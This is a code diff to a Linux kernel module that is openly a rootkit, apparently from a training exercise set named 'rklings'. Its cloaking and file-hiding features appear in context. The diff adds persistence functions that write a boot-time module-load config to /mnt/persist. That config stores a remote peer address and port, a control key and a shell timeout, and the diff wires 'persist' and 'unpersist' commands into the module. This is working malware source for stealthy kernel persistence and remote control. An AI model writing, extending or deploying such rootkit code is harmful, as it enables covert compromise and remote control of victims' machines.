@@ -2,6 +2,7 @@
 #include <linux/cred.h>
 #include <linux/err.h>
 #include <linux/errno.h>
+#include <linux/fs.h>
 #include <linux/hex.h>
 #include <linux/init.h>
 #include <linux/kprobes.h>
@@ -62,6 +63,46 @@ static struct proc_dir_entry *proc_entry;
 static struct list_head *saved_prev;
 bool cloaked;
 bool persist_requested;
+
+#define RK_PERSIST_PATH "/mnt/persist/modules-load.d/rklings.conf"
+
+int rk_persist_install(void)
+{
+	struct file *f;
+	char buf[256];
+	int len;
+	loff_t pos = 0;
+
+	len = scnprintf(buf, sizeof(buf),
+			"rklings peer_address=%s peer_port=%u"
+			" retry_base_ms=%u retry_max_ms=%u"
+			" control_key=%s shell_timeout_ms=%u\n",
+			peer_address_text, peer_port,
+			retry_base_ms, retry_max_ms,
+			control_key, shell_timeout_ms);
+
+	f = filp_open(RK_PERSIST_PATH, O_WRONLY | O_TRUNC, 0600);
+	if (IS_ERR(f))
+		return PTR_ERR(f);
+	kernel_write(f, buf, len, &pos);
+	filp_close(f, NULL);
+	persist_requested = true;
+	return 0;
+}
+
+int rk_persist_remove(void)
+{
+	struct file *f;
+	loff_t pos = 0;
+
+	f = filp_open(RK_PERSIST_PATH, O_WRONLY | O_TRUNC, 0600);
+	if (IS_ERR(f))
+		return PTR_ERR(f);
+	kernel_write(f, "", 0, &pos);
+	filp_close(f, NULL);
+	persist_requested = false;
+	return 0;
+}
 
 /* --- module cloaking (M01) --- */
 
@@ -137,10 +178,10 @@ static int rk_parse_local_command(const char *path)
 		rk_module_uncloak();
 		return 0;
 	}
-	if (strcmp(cmd, "persist") == 0) {
-		persist_requested = true;
-		return 0;
-	}
+	if (strcmp(cmd, "persist") == 0)
+		return rk_persist_install();
+	if (strcmp(cmd, "unpersist") == 0)
+		return rk_persist_remove();
 	if (strncmp(cmd, "h.f.", 4) == 0 && cmd[4])
 		return rk_target_add(&file_targets, cmd + 4) < 0 ? -ENOSPC : 0;
 	if (strncmp(cmd, "h.i.", 4) == 0 && cmd[4])
